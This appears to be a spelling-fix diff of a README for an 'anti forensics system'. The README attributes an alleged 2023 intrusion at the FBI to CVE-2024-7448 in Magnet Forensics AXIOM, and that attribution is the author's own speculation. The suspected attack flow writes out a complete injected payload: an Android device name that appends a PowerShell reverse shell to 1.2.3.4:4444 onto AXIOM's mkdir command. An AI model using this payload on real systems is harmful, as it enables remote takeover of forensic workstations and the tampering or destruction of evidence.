@@ -3,7 +3,7 @@ A 2-step anti forensics system.
 
 # Inspiration
 In current popular media a well known figure is Jeffery Epstein, after hearing about this situation and doing some research
-I came across a very interesting and concerning intrusion that took place on Sunday, Febuary 12th, 2023 affecting the FBI.
+I came across a very interesting and concerning intrusion that took place on Sunday, February 12th, 2023 affecting the FBI.
 This compelled me to try and recreate a similar system for user privacy security and educational use. 
 
 Here is the official report outlining the attack with a timeline included and some other interesting information.
@@ -11,7 +11,7 @@ Timeline begins on page 30.
 https://www.justice.gov/epstein/files/DataSet%209/EFTA00173569.pdf
 
 # What I think happened
-Based on the official report, I beleive CVE-2024-7448 was utilized in this attack through a malcious pre inserted file on an android device.
+Based on the official report, I believe CVE-2024-7448 was utilized in this attack through a malicious pre inserted file on an android device.
 
 CVE-2024-7448 is a critical OS command injection vulnerability in Magnet Forensics AXIOM (prior to version 8.0.0.39753)
 that allows attackers to gain arbitrary code execution via malicious strings in Android device images.
@@ -22,7 +22,7 @@ For example "dir & echo Done" lists files and then immediately prints "Done".
 
 # Suspected Attack Flow
 - Forensics individual plugs android device into Talino workstation.
-- They begin parsing data and storing it in a secure location for future anaylization.
+- They begin parsing data and storing it in a secure location for future analysis.
 - AXIOM organizes files automatically for ease of use, utilizing an automated command such as "cmd.exe /c mkdir C:\Evidence\" + [DeviceName]
 - Attacker knows this, and changes the DeviceName metadata to this line below, then when AXIOM goes to create a secure copy this is what gets executed.
 mkdir C:\Evidence\MyPhone & powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('1.2.3.4',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
